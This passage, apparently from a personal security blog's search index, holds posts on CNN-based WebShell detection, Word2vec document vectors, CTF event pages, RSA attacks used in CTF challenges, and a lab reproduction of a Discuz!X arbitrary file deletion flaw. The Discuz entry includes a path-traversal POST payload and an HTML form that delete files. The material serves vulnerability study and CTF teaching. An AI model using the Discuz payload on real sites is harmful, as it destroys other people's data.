regression","type":"docs"},{"authors":null,"categories":null,"content":"","date":1557010800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1557010800,"objectID":"d145ee68d3274bb3f977e2544b03f77c","permalink":"https://p0st3r.github.io/ml/ch4_1/","publishdate":"2019-05-05T00:00:00+01:00","relpermalink":"/ml/ch4_1/","section":"ml","summary":"","tags":null,"title":"Basic concepts of Decision tree","type":"docs"},{"authors":[""],"categories":null,"content":"Background In order to cope with the current complex and flexible WebShell attack environment and better detect various types of webshells, a text classfication method that combains word2vec and Bi-Gram, which not only considered the semantic features but also the word order features, has a better classfication result than using two features alone.\nIn order to cope with the current complex and flexible WebShell attack environment and better detect various types of webshells, an improved WebShell detection method based on CNN was proposed by improving text feature extraction and convolutional neural network structure. First, precompile the PHP data set to get the opcode instruction sequence. Secondly, Word2vec is used to extract the word vectors of the original text and the phrase segmented by bi-gram respectively, and it serves as the two inputs of the convolutional neural network. Finally, the detection is carried out through the designed convolutional neural network. Through experiments, this method effectively improves the accuracy, recall rate and other performance parameters while compared with other methods.\nIntroduction Word-NG vec In fact, the word embedding learned in Word2vec are more reflect in semantic similarity features , such as \u0026ldquo;extract\u0026rdquo; and \u0026ldquo;take\u0026rdquo;, \u0026ldquo;compression\u0026rdquo; and \u0026ldquo;reduction\u0026rdquo;, but without taking the word order features into account. Sometimes there are some differences with the actual semantics, for example:\n The USA started a trade war on China\n The main predicates of two sentences are interchanged to express different meanings, but there is no difference in Word2Vec. However, if N-Gram is used to divide the text into word groups , we can obtain the word order feature of the text，such as:\n   Orignal The USA started a trade war on China     Word2vec “The USA”，“started”，\u0026ldquo;a\u0026rdquo;，“trade war”，“on”，“China” (vector)   2-gram “The USA/The USA” ，“The USA/started”，\u0026ldquo;stared\u0026rdquo;/a”，“a/trade war”，\u0026ldquo;trade war/on\u0026rdquo;，“on China”    \r\nCombining N-Gram with Word2vec, the word vectors of the original text and 2-gram pharse are both trained by Word2vec as the general features of the text, taking into account not only the semantic features, but also the word order features. In this way, two similar sentences can be correctly classifcated.\nConvolutional Neural Network Based on the Kim Y\u0026rsquo;s TextCNN, combined with the two-channel convolutional neural network, a text classification model DCTF-CNN(Double-Channels and Trible-Filters Convolutional Neural Network) was constructed.\nThe structure of the neural network is shown below:\n\r\nThe model includes five layers: input layer, convolution layer, pooling layer, full-link layer and output layer.In the input layer, T1 channel and T2 channel respectively input the word vector of the original text and the word vector of the 2-gram pharse. The convolution layer is composed of three convolution kernels of different widths, each of which covers the local characteristics of different granularity.In the pooling layer, the global maximum value is pooled, and the maximum value is reserved for each convolution kernel, which can effectively extract the most representative features.Two feature vectors were spliced in the full link layer, and finally two types of distributions, namely the probability distribution of WebShell and normal files, were output through Softmax in the output layer.\nPHP opcode PHP is an interpreted language, and its code execution process can be divided into Lexical Analysis stage, Syntax Analysis stage, byte code compilation stage and code execution stage.The execution flow diagram is shown in the solid line section in the below:\n\r\nIn the lexical analysis phase, the Lexer reads the source code sequence of characters in sequence and shred them into Token sequences according to PHP syntax rules.In the Syntax analysis stage, the Token sequence is read in by the Parser to be syntactically checked, and then the Abstract Syntax Tree (AST) is generated.In the bytecode compilation phase, the PHP virtual machine Zend reads in the abstract syntax tree and translates the action nodes in the syntax tree into the corresponding bytecode.In the code execution stage, the PHP virtual machine Zend loads the corresponding module according to the code call, initializes the running environment, and finally executes the bytecode instruction and outputs the result.\nFor example, the following code:\n\u0026lt;?php\recho’Hello World’;\r$a=1+1;\recho $a;\r?\u0026gt;\rAfter PHP code compilation by VLD extension, the code can be compiled into following opcode:\nZEND_ECHO ’Hello World’\rZEND_ADD ~ 0 1 1\rZEND_ASSIGN!0 ~ 0\rZEND_ECHI ~ 0\rIn this paper, the collected PHP datasets is compiled into opcode to word embedding, so as to avoid the interference of useless annotations added in the WebShell which might bypass static detection. In this way the generalization of the model could be imporved\nAssessment Experimental data sets were obtained from the following sources:\n   Type sources     WebShell https://github.com/tennc/webshell https://github.com/JohnTroony/php-webshells https://github.com/ysrc/webshell-sample https://github.com/tanjiti/webshellSample https://github.com/xl7dev/WebShell   Normal Page https://github.com/WordPress/WordPress https://github.com/phpmyadmin/phpmyadmin https://github.com/typecho/typecho https://github.com/bcit-ci/CodeIgniter https://github.com/laravel/laravel    Remove duplicate files by md5 comparsion, a total of 2387 WebShell samples and 2316 Normal Page samples were obtained.\nThe WebShell samples covers One-word Trojan, small Trojan and giant Trojan all types of WebShell.\nThe Normal Page covers blog cms，php development framework and database management system, and the similar page was remove to optimize data sets.\nUsage Download code and data sets\ngit clone https://github.com/liyuanzi/WordNG-vec_WebShell_detect\rThis code requires Python2.7\nconda create --name py27 python=2.7\rInitialization environment\npip install -r requerments.txt\rstart trainning\n$ nohup python -u webshell.py \u0026gt;dctf.txt 2\u0026gt;\u0026amp;1 \u0026amp; tail -f dctf.txt\rThe word embedding process takes a very long time，use nohup to avoid the word embedding process fail because the terminal closed unexpectly. The result is loaded into dctf.txt\nExample A Comparsion examination on a small size data sets .\n   features Accuracy Precision Recall F1-score     2-gram 0.798 0.714 0.196 0.308   opcode sequences 0.969 0.998 0.823 0.902   Word2vec 0.958 0.994 0.918 0.954   bigram-word2vec 0.960 0.978 0.937 0.958   Word-NG vec 0.984 0.995 0.971 0.982    ","date":1557619200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1557619200,"objectID":"480d1bc838e07ae3b340b1dd81565c40","permalink":"https://p0st3r.github.io/publication/webshell-detection-based-on-semantic-features/","publishdate":"2017-01-01T00:00:00Z","relpermalink":"/publication/webshell-detection-based-on-semantic-features/","section":"publication","summary":"Proposed a WebShell detection method by combaining N-Gram and Word2vec.","tags":["NLP"],"title":"WebShell detection based on semantic features","type":"publication"},{"authors":[""],"categories":["NLP"],"content":"Word2vec是一种将文本转化为词向量的算法，即将词条映射为一个定长的连续的稠密向量，由这些向量构成一个向量空间，该向量的维数可以在事前确定，一般可以为50维或100维。\n例如：\nApple = [1.2,0.2,0.3,0.5]\rPear = [0.1,0.3,0.5,1.5]\rBanana = [2.2,0.2,0.4,0.6]\rOrange = [0.6,0.1,1.0,0.2]\r每个词被表示成一个[1,4]的向量矩阵。\n在文本处理的任务中直接处理的是文当，而一个文本中包含很多词，所以需要将文本想办法用Word2vec向量表示 。这里有两种思路：\n  直接将各个词的词向量串接起来，将整个文档表示成一个三维的向量 将文本中各个词的词向量相加求平均，由最终的平均向量代表整个文本   三维文档向量 处理如图所示：\n最终将文档表示成一个[M, P, F]三维向量，其中M代表文档个数，P代表每个文档的长度，为了便于神 经网络处理会将P处理成统一 长度，F代表最大特征值，即Word2vec训练出的向量大小。\n这种表示方法CNN处理效果较好。\n代码实例如下：\n#为了统一文本长度，设置最大文本长度，超过的截断，不足的用0.向量补齐\r max_document_length = 500\r#最大特征长度，即训练的词向量维度\r max_feature = 200\rdef getVecsByWord2Vec(model, corpus, size):\rglobal max_document_length\rall_vectors = []\rembeddingDim = model.vector_size\r#0.向量，用于填充\r embeddingUnknown = [0. for i in range(embeddingDim)]\r#逐句获取词向量并拼接\r for text in corpus:\rthis_vector = []\r#切除掉最大文档长度后的词\r text = text[:max_document_length]\r#逐词获取词向量并拼接\r for i,word in enumerate(text):\rif word in model.wv.vocab: this_vector.append(model[word])\relse:\rthis_vector.append(embeddingUnknown)\r#不足长度的填充至最大文档长度  dim = np.shape(this_vector)\rif dim[0] \u0026lt; max_document_length: pad_length = max_document_length-i-1\rfor n in range(0,pad_length):\rthis_vector.append(embeddingUnknown) all_vectors.append(this_vector)\rx = np.array(all_vectors)\rreturn x\rdef get_feature_by_opcode_word2vec():\rglobal max_document_length\rx = []\ry = []\r# 若有三维文档向量直接加载\r if os.path.exists(wv_data_pkl_file) and os.path.exists(label_pkl_file):\rf = open(wv_data_pkl_file, \u0026#39;rb\u0026#39;)\rx = pickle.load(f)\rf.close()\rf = open(label_pkl_file, \u0026#39;rb\u0026#39;)\ry = pickle.load(f)\rf.close()\relse:\r# 导入训练数据，自定\r x, y = load_data_pkl_file()\rcores=multiprocessing.cpu_count()\r#若有训练好的词向量模型则直接加载\r if os.path.exists(word2vec_bin):\rprint \u0026#34;Find cache file %s\u0026#34; % word2vec_bin\rmodel=gensim.models.Word2Vec.load(word2vec_bin)\r#若没有则训练再保存词向量模型\r else:\rmodel=gensim.models.Word2Vec(size=max_features, window=5, min_count=5, iter=10, workers=cores)\rmodel.build_vocab(x)\rmodel.train(x, total_examples=model.corpus_count, epochs=model.iter)\rmodel.save(word2vec_bin)\r#循环拼接出三维文档集合向量\r x = getVecsByWord2Vec(model, x, max_features)\rf = open(wv_data_pkl_file, \u0026#39;wb\u0026#39;)\rpickle.dump(x, f)\rf.close()\rreturn x,y\r平均词向量 直接将每个文档中所有词的词向量相加求平均 ，用一个[1,F]的二维平均向量代表改文档。再将所有文档逐个拼接得到一个[M,F]的向量来表示整个文档集合。这种表示方法计算量较小 ，MLP处理效果还好，CNN效果极差。\n代码实例如下：\n#最大特征长度，即训练的词向量维度\r max_feature = 200\rdef buildWordVector(model,text, size):\rvec = np.zeros(size).reshape((1, size))\rcount = 0.\r#逐词获取词向量并累加\r for word in text:\rtry:\rvec += model[word].reshape((1, size))\rcount += 1.\rexcept KeyError:\rcontinue\r#求平均向量\r if count != 0:\rvec /= count\rreturn vec\rdef get_feature_by_opcode_word2vec():\rglobal max_document_length\rx = []\ry = []\r# 若有三维文档向量直接加载\r if os.path.exists(wv_data_pkl_file) and os.path.exists(label_pkl_file):\rf = open(wv_data_pkl_file, \u0026#39;rb\u0026#39;)\rx = pickle.load(f)\rf.close()\rf = open(label_pkl_file, \u0026#39;rb\u0026#39;)\ry = pickle.load(f)\rf.close()\relse:\r# 导入训练数据，自定\r x, y = load_data_pkl_file()\rcores=multiprocessing.cpu_count()\r#若有训练好的词向量模型则直接加载\r if os.path.exists(word2vec_bin):\rprint \u0026#34;Find cache file %s\u0026#34; % word2vec_bin\rmodel=gensim.models.Word2Vec.load(word2vec_bin)\r#若没有则训练再保存词向量模型\r else:\rmodel=gensim.models.Word2Vec(size=max_features, window=5, min_count=5, iter=10, workers=cores)\rmodel.build_vocab(x)\rmodel.train(x, total_examples=model.corpus_count, epochs=model.iter)\rmodel.save(word2vec_bin)\r#循环拼接出二维文档集合向量\r x= np.concatenate([buildWordVector(model,z, max_features) for z in x])\r#归一化\r x = scale(x)\rf = open(wv_data_pkl_file, \u0026#39;wb\u0026#39;)\rpickle.dump(x, f)\rf.close()\rreturn x,y\r","date":1557360000,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1557360000,"objectID":"a3d7cbe125e132b0bf6474393424360e","permalink":"https://p0st3r.github.io/post/word2vec-presentation/","publishdate":"2019-05-09T00:00:00Z","relpermalink":"/post/word2vec-presentation/","section":"post","summary":"Word2vec是一种将词转换成词向量表示的方法，在某些文本处理的任务中直接处理的是文档，而一个文本中包含很多词，这里给出了两种使用Word2vec词向量表示文档集合的表示方法。","tags":["Word2Vec"],"title":"Word2vec的文档表示方法","type":"post"},{"authors":[],"categories":null,"content":"奖项设置   一等奖（1名）\n1000现金或实物\n  二等奖（2名）\n500现金或实物（jbl蓝牙耳机）\n  三等奖（5名）\n200现金或实物（razer键盘）\n  优秀奖（10名）\n金士顿u盘一个\n    ","date":1539907200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1539907200,"objectID":"276711c3313039e086682398defee124","permalink":"https://p0st3r.github.io/talk/xp0intctf2018/","publishdate":"2017-01-01T00:00:00Z","relpermalink":"/talk/xp0intctf2018/","section":"talk","summary":"一封来自Xp0int 2018 新生杯的邀请函","tags":[],"title":"Xp0intCTF2018","type":"talk"},{"authors":null,"categories":null,"content":"Nothing on this website requires you to identify yourself. The only personal information collected while you visit this site is non-identifying information, such as browser type and operating system. This information is collected by Google Analytics for measuring visitor traffic to this site.\nI do not collect this information and have no access to it other than as aggregated reports. Here is the Google Analytics privacy page.\nThis information is collected via cookies. Most web browsers allow you to control handling of cookies. You can disable all cookies for this website without in any way reducing the functionality for you.\nI have designed this website so that your IP address is anonymised within Google Analytics and the “Do Not Track” request is respected.\nI don’t collect your personal information, so there is nothing I can share.\nGoogle Analytics does collect some information about you. See the Google Analytics privacy page.\nFor each visitor to reach the site, Google Analytics collects the following non-personally identifiable information, including but not limited to browser type, version and language, operating system, pages viewed while browsing the site, page access times and referring website address. This information is presented to me as aggregated reports for the purpose of gauging visitor traffic and trends.\n","date":1530140400,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1530140400,"objectID":"18d05a63a1c8d7ed973cc51838494e41","permalink":"https://p0st3r.github.io/privacy/","publishdate":"2018-06-28T00:00:00+01:00","relpermalink":"/privacy/","section":"","summary":"Nothing on this website requires you to identify yourself. The only personal information collected while you visit this site is non-identifying information, such as browser type and operating system. This information is collected by Google Analytics for measuring visitor traffic to this site.","tags":null,"title":"Privacy Policy","type":"page"},{"authors":[""],"categories":["Crypt"],"content":"RSA基于一个简单的数论事实，两个大素数相乘十分容易，将其进行因式分解确实困难的。在量子计算机还没有成熟的今天，RSA算法凭借其良好的抵抗各种攻击的能力，在公钥密码体制中发挥着中流砥柱的作用。然而即便RSA算法目前来说是安全可靠的，但是错误的应用场景，错误的环境配置，以及错误的使用方法，都会导致RSA的算法体系出现问题，从而也派生出针对各种特定场景下的RSA攻击方法。\nRSA算法描述 RSA算法涉及三个参数，n，e，d，私钥为{n，d}，公钥为{n，e}。\n$n= p*q$\n$φ(n)= (p-1)*(q-1)$\n其中n是两个大素数p，q的乘积。\nd是e模φ(n)的逆元，φ(n)是n的欧拉函数。\n$e^d = 1 mod φ(n)$\nc为密文，m为明文，则加密过程如下：\n$c = m^e mod φ(n)$ $m = c^d mod φ(n)$\nRSA题目类型 在CTF竞赛中，RSA理所当然处在CRYPTO中居多。而且RSA作为典型的加密算法，其出镜率可谓相当高，基本上所有比赛都会有几道RSA的题目出现。\n数据处理 在进行做题之前，我们要将数据处理成可以做题的模式。基本上来说，RSA的题目都是围绕着c，m，e，d，n，p，q这几个参数展开的，但是题目一般不会直接给这种样子的参数，而是通过别的方式给出，这里就需要我们使用一些工具或者自己手工将这些参数提取出来。\n pem文件  对此类文件可以直接使用openssl提取，大概使用过的方式有：\nopenssl rsautl -encrypt -in FLAG -inkey public.pem -pubin -out flag.enc\ropenssl rsa -pubin -text -modulus -in warmup -in public.pem\r pcap文件  针对此类文件可以使用wireshark follow一下。这种问题一般都是写了一个交互的crypto系统，所以可能产生多轮交互。\n PPC模式  这种模式是上述pcap文件的交互版，会给一个端口进行一些crypto的交互，参数会在交互中给出。\n第二个需要处理的就是明密文，这个方法多多，不多赘述。\n模数分解 解决RSA题目最简单，最暴力，最好使的方法就是分解模数n。如果能够将n分解成功，成功得到p，q的取值，那么可求n的欧拉函数的值。\n$φ(n) = (p-1)(q-1)$ $n = p*q$\n而通过e，d与n的欧拉函数满足如下关系:\n$ed = 1 mod φ(n)$\n$e = d^-1 mod φ(n)$\n通过欧几里得算法可以通过e与n的欧拉函数的值轻易求出d，从而计算出解密密钥。\n即在知道e，p，q的情况下，可以解出d：\ndef egcd(a, b):\rif a == 0:\rreturn (b, 0, 1)\relse:\rg, y, x = egcd(b % a, a)\rreturn (g, x - (b // a) * y, y)\rdef modinv(a, m):\rg, x, y = egcd(a, m)\rif g != 1:\rraise Exception(\u0026#39;modular inverse does not exist\u0026#39;)\relse:\rreturn x % m\rmodinv函数即为求模拟的函数，在知道e，p，q的情况下，可以：\nd=modinv(e,(p-1)*(q-1))\r即可求出解密密钥。\n写到这里，要提出一个细节问题，在利用python进行rsa的题目求解过程中：\n$c = m^e mod φ(n)$\n​ 此类运算需要使用pow函数来进行求解，而不是直接m**e % n，这样会慢死的。Python在处理此类运算进行了优化。比如刚才在已知p，q的时候利用modinv函数求出了d，然后就可以利用pow函数求出明文：\nm=pow(c,d,n)\r例题：\nhttps://www.jarvisoj.com (very easy RSA)\n题目中直接给了p，q，e。\n可以直接求出d：\np = 3487583947589437589237958723892346254777\rq = 8767867843568934765983476584376578389\re = 65537\rd = modinv(e, (p-1)*(q-1))\rprint d\r直接分解n 素数分解问题是困难的，但是可以通过计算机进行暴力分解。1999年，名为Cray的超级计算机用了5个月时间分解了512bit的n。2009年，一群研究人员成功分解了768bit的n。2010年，又提出了一些针对1024bit的n的分解的途径，但是没有正面分解成功。通常意义上来说，一般认为2048bit以上的n是安全的。现在一般的公钥证书都是4096bit的证书。\n如果n比较小，那么可以通过工具进行直接n分解，从而得到私钥。如果n的大小小于256bit，那么我们通过本地工具即可爆破成功。例如采用windows平台的RSATool2v17，可以在几分钟内完成256bit的n的分解。\n如果n在768bit或者更高，可以尝试使用一些在线的n分解网站，这些网站会存储一些已经分解成功的n，比如：\rhttp://factordb.com\n通过在此类网站上查询n，如果可以分解或者之前分解成功过，那么可以直接得到p和q。然后利用前述方法求解得到密文。\n题目识别\n此类问题一般是分值较小的题目，提取出n之后可以发现n的长度小于等于512bit，可以直接取分解n。如果大于512bit，建议在使用每个题目都用后面所说的方法去解题。\n例题\n比如在某次竞赛中，发现：\nn=87924348264132406875276140514499937145050893665602592992418171647042491658461\r利用factordb分解：\nn = 275127860351348928173285174381581152299*319576316814478949870590164193048041239\r利用公约数 如果在两次公钥的加密过程中使用的n1和n2具有相同的素因子，那么可以利用欧几里得算法直接将n1和n2分解。\n通过欧几里得算法可以直接求出n1和n2的最大公约数p：\ngcd(n1,n2)=p\r可以得出\n$n1 = pq_1$ $n2 = pq_2$\n直接分解成功。而欧几里得算法的时间复杂度为：O(log n)。这个时间复杂度即便是4096 bit也是秒破级别。\ndef gcd(a, b):\rif a \u0026lt; b:\ra, b = b, a\rwhile b != 0:\rtemp = a % b\ra = b\rb = temp\rreturn a\r题目识别\n识别此类题目，通常会发现题目给了若干个n，均不相同，并且都是2048bit，4096bit级别，无法正面硬杠，并且明文都没什么联系，e也一般取65537。\n例题\n在一个题目中，你拿到了两个n，e都为65537，两个n分别为：\nn1=9051013965404084482870087864821455535159008696042953021965631089095795348830954383127323853272528967729311045179605407693592665683311660581204886571146327720288455874927281128121117323579691204792399913106627543274457036172455814805715668293705603675386878220947722186914112990452722174363713630297685159669328951520891938403452797650685849523658191947411429068829734053745180460758604283051344339641429819373112365211739216160420494167071996438506850526168389386850499796102003625404245645796271690310748804327\rn2=13225948396179603816062046418717214792668512413625091569997524364243995991961018894150059207824093837420451375240550310050209398964506318518991620142575926623780411532257230701985821629425722030608722035570690474171259238153947095310303522831971664666067542649034461621725656234869005501293423975184701929729170077280251436216167293058560030089006140224375425679571181787206982712477261432579537981278055755344573767076951793312062480275004564657590263719816033564139497109942073701755011873153205366238585665743\r通过直接分解，上factordb都分解失败。通过尝试发现：\nprint gcd(n1,n2)\r打印出：\n1564859779720039565508870182569324208117555667917997801104862601098933699462849007879184203051278194180664616470669559575370868384820368930104560074538872199213236203822337186927275879139590248731148622362880471439310489228147093224418374555428793546002109\r则此致即为两个n共有的素因子p，然后进一步求出q，求解完毕。\nFermat方法与Pollard rho方法 针对大整数的分解有很多种算法，性能上各有优异，有Fermat方法，Pollard rho方法，试除法，以及椭圆曲线法，连分数法，二次筛选法，数域分析法等等。其中一些方法应用在RSA的攻击上也有奇效。\n在p，q的取值差异过大，或者p，q的取值过于相近的时候，Format方法与Pollard rho方法都可以很快将n分解成功。\n此类分解方法有一个开源项目yafu将其自动化实现了，不论n的大小，只要p和q存在相差过大或者过近时，都可以通过yafu很快地分解成功。\n题目识别\n在直接分解n无望，不能利用公约数分解n之后，都应该使用yafu去试一下。\n例题\nhttps://www.jarvisoj.com (Medium RSA)\n此题首先从pem中提取N和e，然后上yafu，直接分解成功。\n低加密指数攻击 在RSA中e也称为加密指数。由于e是可以随意选取的，选取小一点的e可以缩短加密时间，但是选取不当的话，就会造成安全问题。\ne=3时的小明文攻击 当e=3时，如果明文过小，导致明文的三次方仍然小于n，那么通过直接对密文三次开方，即可得到明文。\n即：\n$c = m^e mod φ(n)$\n如果e=3，且 m^e \u0026lt; n，那么：\n$c = m^e$ $e = 3$ $m = \\sqrt{3} c$\n如果明文的三次方比n大，但是不是足够大，那么设k，有：\n$c = m^e+kn$\n爆破k，如果$c-kn$能开三次根式，那么可以直接得到明文。\n题目识别\n在e=3的时候首先尝试这种方法\n例题\nhttps://www.jarvisoj.com (Extremely hard RSA)\n关键代码如下：此题通过不断给明文+n开三次方即可求得：\ni=0\rwhile 1:\rif(gmpy.root(c+i*N, 3)[1]==1):\rprint gmpy.root(c+i*N, 3)\rbreak\ri=i+1\r低加密指数广播攻击 如果选取的加密指数较低，并且使用了相同的加密指数给一个接受者的群发送相同的信息，那么可以进行广播攻击得到明文。\n即，选取了相同的加密指数e（这里取e=3），对相同的明文m进行了加密并进行了消息的传递，那么有：\n$ c_1 = m^e$ $mod$ $n_1$\n$c_2 = m^e$ $mod$ $n_2$\n$ c_3 = m^e$ $mod$ $n_3$\n对上述等式运用中国剩余定理，在e=3时，可以得到：\n$ c_x = m^3$ $mod$ $n_1n_2n_3$\n通过对$ c_x $进行三次开方可以求得明文。\n题目识别\n一般来说都是给了三组加密的参数和明密文，其中题目很明确地能告诉你这三组的明文都是一样的，并且e都取了一个较小的数字。\n例题：\nSCTF2016，CODE300\n题目第二轮中通过流量包的方式给了广播攻击的参数。\n直接给国外类似一题的网址：http://codezen.fr/2014/01/16/hackyou-2014-crypto-400-cryptonet\nCoppersmith定理攻击 Coppersmith定理指出在一个e阶的mod n多项式f(x)中，如果有一个根小于，就可以运用一个O(log n)的算法求出这些根。\nCoppersmith定理指出在一个e阶的mod n多项式f(x)中，如果有一个根小于$ n^frac{1}{e} $，就可以运用一个O(log n)的算法求出这些根。\n这个定理可以应用于RSA算法。如果e = 3并且在明文当中只有三分之二的比特是已知的，这种算法可以求出明文中所有的比特。\n并未找到真题。\n低解密指数攻击 与低加密指数相同，低解密指数可以加快解密的过程，但是者也带来了安全问题。\n那么一种基于连分数(一个数论当中的问题)的特殊攻击类型就可以危害RSA的安全。此时需要满足：\n$q\u0026lt;$$p$$\u0026lt;2q$\n如果满足上述条件，通过Wiener Attack可以在多项式时间中分解n。\nrsa-wiener-attack的攻击源码开源在了github中，采取python编写，可以很容易使用。\n题目识别\ne看起来很大就行了。\n例题\n直接github用工具就行。https://github.com/pablocelayes/rsa-wiener-attack\n这里注意一个细节问题，如果在运行脚本的时候报错，请在脚本前加上：\nimport sys\rsys.setrecursionlimit(10000000)\r共模攻击 如果在RSA的使用中使用了相同的模n对相同的明文m进行了加密，那么就可以在不分解n的情况下还原出明文m的值。即：\n$ c_1=m^{e_1}$ $mod$ $n$\n$ c_2=m^{e_2}$ $mod$ $n$\n即存在$ s_2 $，$ s_2 $使得：\n$ s1^{e_1} + s2^{e_2} = 1 $\n又因为\n$ c_1= m^{e_1}$ $mod$ $n$\n$ c_2 = m^{e_2}$ $mod$ $n$\n明文解出。\n题目识别\n非常简单，若干次加密，每次n都一样，明文根据题意也一样即可。\n例题\nhttps://www.jarvisoj.com (very hard RSA)\n如果已知：n1，n2，c1，c2，e1，e2，并且其中n1=n2的话：\ns = egcd(e1, e2)\rs1 = s[1]\rs2 = s[2]\rprint s\rn=n1\rif s1\u0026lt;0:\rs1 = - s1\rc1 = modinv(c1, n)\relif s2\u0026lt;0:\rs2 = - s2\rc2 = modinv(c2, n)\rm=(pow(c1,s1,n)*pow(c2,s2,n)) % n\r","date":1525824000,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1525824000,"objectID":"8e42215ffcd2f39ae02f92c3b8b6de82","permalink":"https://p0st3r.github.io/post/rsa-in-ctf/","publishdate":"2018-05-09T00:00:00Z","relpermalink":"/post/rsa-in-ctf/","section":"post","summary":"针对一些在CTF中常见的RSA攻击方法，从如何识别应该应用那种方法以及如何去解题来介绍CTF中的RSA题目的常见解法。","tags":["Crypt","RSA","CTFs"],"title":"CTF中RSA的常见攻击方法","type":"post"},{"authors":[],"categories":null,"content":"报名方式 登录网站 www.giantbranch.cn:8889\n点击Register\u0026ndash;\u0026gt;填写邮箱队伍名字及密码；最后点击Login输入队伍名字和密码登录网站；点击challenge进行比赛)\n比赛规则 本次比赛采取线上赛，只需要一台电脑便能完成比赛，选手通过平台进行做题，每道题目有相应的分值，解题多者且分值高将获得更高的排位，分数相同时将按flag提交的时间先后进行排名。\n详细规则请阅读\nhttp://www.giantbranch.cn:8889/%E8%A7%84%E5%88%99\nCTF CTF（Capture The Flag）起源于1996年DEFCON全球黑客大会，在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式，以代替之前黑客们通过互相发起真实攻击进行技术比拼的方式，发展至今已经成为全球范围网络安全圈流行的竞赛形式。\nCTF竞赛模式具体分为以下三类：\n 解题模式（Jeopardy）  在解题模式CTF赛制中，参赛队伍可以通过互联网或者现场网络参与，题目主要包含逆向、漏洞挖掘与利用、Web渗透、密码、取证、隐写、安全编程等类别。\n 攻防模式（Attack-Defense）  在攻防模式CTF赛制中，参赛队伍在网络空间互相进行攻击和防守，挖掘网络服务漏洞并攻击对手服务来得分，修补自身服务漏洞进行防御来避免丢分，最终以得分直接分出胜负。\n 混合模式（Mix）  结合了解题模式与攻防模式的CTF赛制，参赛队伍通过解题获取初始分数，然后通过攻防对抗进行得分增减，最终以得分高低分出胜负。\nCTF入门资料 Web 《白帽子讲web安全》，吴翰清著\n《黑客攻防技术宝典：Web实战篇》，Dafydd Stuttard著\nReverse 吾爱破解：http://www.52pojie.cn/\n看雪论坛：http://bbs.pediy.com/\n《加密与解密》，段钢著\n《汇编语言》，王爽著\n《逆向工程核心原理》,李承远著\nCrypto 《图解密码学技术》，结城浩著\n《现代密码学——原理与协议》，Jonathan Katz著\nPwn 《0day安全软件漏洞分析技术》\n《漏洞战争》\nCTF练习网站 合天：http://www.hetianlab.com/CTFrace.html\n实验吧：http://www.shiyanbar.com/ctf/practice\ni春秋：https://www.ichunqiu.com/racing\n南邮攻防平台：http://ctf.nuptsast.com/\nJarvisOJ：https://www.jarvisoj.com/\nXCTF-OJ：http://oj.xctf.org.cn\nSniperOJ：http://www.sniperoj.com/\nCTF常用工具下载：https://www.ctftools.com/down/\n Xp0int团队是于2016年成立的暨南大学校园信息安全团队，团队成立至今，举办过补天暨大校园行、合天暨大网安见面会、Xp0intCon等大型活动。成员曾获过广东省第一届”强网杯”网络安全大赛高校组冠军、信息安全“铁人三项”个人赛华南赛区冠军、广东省首届“红帽杯”网络安全大赛高校组亚军等奖项，多位成员现任职于阿里巴巴、腾讯、绿盟科技等安全公司。\n ","date":1508544000,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1508544000,"objectID":"9379c616365141b60fbac79b094c680c","permalink":"https://p0st3r.github.io/talk/xp0intctf2017/","publishdate":"2017-01-01T00:00:00Z","relpermalink":"/talk/xp0intctf2017/","section":"talk","summary":"第二届\"Xp0intCTF\"新生赛震撼来袭!","tags":[],"title":"Xp0intCTF2017","type":"talk"},{"authors":[""],"categories":["Hack"],"content":"简介 Discuz!X社区软件，是一个采用 PHP 和 MySQL 等其他多种数据库构建的性能优异、功能全面、安全稳定的社区论坛平台。\n2017年9月29日，Discuz!修复了一个安全问题用于加强安全性，这个漏洞会导致前台用户可以任意删除文件。\n该漏洞于2014年6月被提交到 Wooyun漏洞平台，Seebug漏洞平台收录了该漏洞，漏洞编号 ssvid-93588。该漏洞通过配置属性值，导致任意文件删除。经过分析确认，原有的利用方式已经被修复，添加了对属性的 formtype 判断，但修复方式不完全导致可以绕过，通过模拟文件上传可以进入其他 unlink 条件，实现任意文件删除漏洞。\n 影响版本： 2.5-3.4 修复方案:  https://gitee.com/ComsenzDiscuz/DiscuzX/commit/7d603a197c2717ef1d7e9ba654cf72aa42d3e574\n删除unlink相关代码。\n原理 核心问题在 ==upload/source/include/spacecp/spacecp_profile.php==\n跟入代码70行,当提交 ==profilesubmit== 时进入判断，跟入177行\n我们发现如果满足配置文件中某个==formtype==的类型为 ==file==，我们就可以进入判断逻辑，我们接着看这次修复的改动，可以发现228行再次引入语句 ==unlink==\n当上传文件并上传成功，即可进入 unlink 语句\n然后回溯变量==$space[$key]==,不难发现这就是用户的个人设置。\n只要找到一个可以控制的变量即可，这里选择了 ==birthprovince。==\n在设置页面直接提交就可以绕过字段内容的限制了。\n成功实现了任意文件删除\n复现 环境：win7+phpstudy+discuz3.2\n新建importantfile.txt作为测试\n进入设置-个人资料，先在页面源代码找到formhash值\nhttp://10.0.2.15:8999/discuz3_2/home.php?mod=spacecp\u0026amp;ac=profile\r可以看到formhash值是b21b6577。\n再访问\n10.0.2.15:8999/discuz3_2/home.php?mod=spacecp\u0026amp;ac=profile\u0026amp;op=base\rPost数据：\nbirthprovince=../../../importantfile.txt\u0026amp;profilesubmit=1\u0026amp;formhash=b21b6577\r如图\n执行后\n出生地被修改成要删除的文件。\n最后构造表单执行删除文件\n\u0026lt;form action=”http://10.0.2.15:8999/discuz3_2/home.php?mod=spacecp\u0026amp;ac=profile\u0026amp;op=base” method=”POST” enctype=”multipart/form-data”\u0026gt;\r\u0026lt;input type=”file” name=”birthprovince” id=”file” /\u0026gt;\r\u0026lt;input type=”text” name=”formhash” value=”b21b6577″/\u0026gt;\u0026lt;/p\u0026gt;\r\u0026lt;input type=”text” name=”profilesubmit” value=”1″/\u0026gt;\u0026lt;/p\u0026gt;\r\u0026lt;input type=”submit” value=”Submit” /\u0026gt;\r\u0026lt;/from\u0026gt;\r随便上传一张图片，即可删除importantfile.txt\n成功删除importantfile.txt\n修复 Discuz!X 